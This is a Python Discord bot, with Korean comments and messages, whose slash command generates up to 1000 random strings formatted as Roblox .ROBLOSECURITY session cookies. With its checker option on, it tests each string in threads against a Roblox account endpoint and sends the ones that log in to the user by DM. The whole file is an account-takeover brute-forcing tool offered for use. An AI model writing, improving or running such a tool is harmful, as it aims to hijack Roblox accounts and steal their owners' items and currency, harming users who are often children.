import os
import random
import threading
from queue import Queue
import requests
import asyncio
import discord
from discord import app_commands
from discord.ext import commands

TOKEN = os.environ.get('DISCORD_TOKEN')  # Zeabur 환경변수에 꼭 넣어야 됨

INTRO = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
LETTERS = 'ABCDEF'
CHECK_URL = 'https://accountinformation.roblox.com/v1/birthdate'

cookie_queue = Queue()
valid_cookies = []
lock = threading.Lock()

def generate_cookie():
    return INTRO + ''.join(random.choices(LETTERS + '0123456789', k=732))

def check_login(cookie):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        res = requests.get(CHECK_URL, headers=headers, timeout=5)
        return res.status_code == 200
    except:
        return False

def worker():
    while True:
        cookie = cookie_queue.get()
        if cookie is None:
            break
        if check_login(cookie):
            with lock:
                valid_cookies.append(cookie)
        cookie_queue.task_done()

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} 로그인 완료')
    await bot.tree.sync()
    print('슬래시 커맨드 등록 완료!')

@bot.tree.command(name="쿠키랜덤", description="쿠키 생성 및 선택적으로 로그인 체크 후 DM으로 결과 전송")
@app_commands.describe(count="생성할 쿠키 개수 (1~1000)", checker="로그인 체크 여부 (on/off, 기본 off)")
async def cookie_random(interaction: discord.Interaction, count: int, checker: str = 'off'):
    if count < 1 or count > 1000:
        await interaction.response.send_message("쿠키 개수 1~1000 사이로 넣어", ephemeral=True)
        return

    checker = checker.lower()
    if checker not in ['on', 'off']:
        await interaction.response.send_message("체커 옵션은 'on' 아니면 'off'만 가능", ephemeral=True)
        return

    await interaction.response.send_message(f"쿠키 {count}개 생성 시작! 로그인 체크: {checker}", ephemeral=True)

    global valid_cookies
    valid_cookies = []

    cookies = [generate_cookie() for _ in range(count)]

    if checker == 'on':
        for c in cookies:
            cookie_queue.put(c)

        thread_count = min(20, max(2, count // 50))
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        while not cookie_queue.empty():
            await asyncio.sleep(1)

        for _ in range(thread_count):
            cookie_queue.put(None)
        for t in threads:
            t.join()

        if valid_cookies:
            content = "=== 로그인 성공 쿠키 ===\n\n" + '\n'.join(valid_cookies)
        else:
            content = "유효한 쿠키 못 찾음"
    else:
        content = "=== 생성된 쿠키 ===\n\n" + '\n'.join(cookies)

    try:
        dm = await interaction.user.create_dm()
        max_len = 1900
        for i in range(0, len(content), max_len):
            await dm.send(content[i:i+max_len])
    except Exception as e:
        await interaction.followup.send(f"DM 전송 실패: {e}", ephemeral=True)
        return

    print(f"{interaction.user} DM으로 결과 전송 완료")

bot.run(TOKEN)
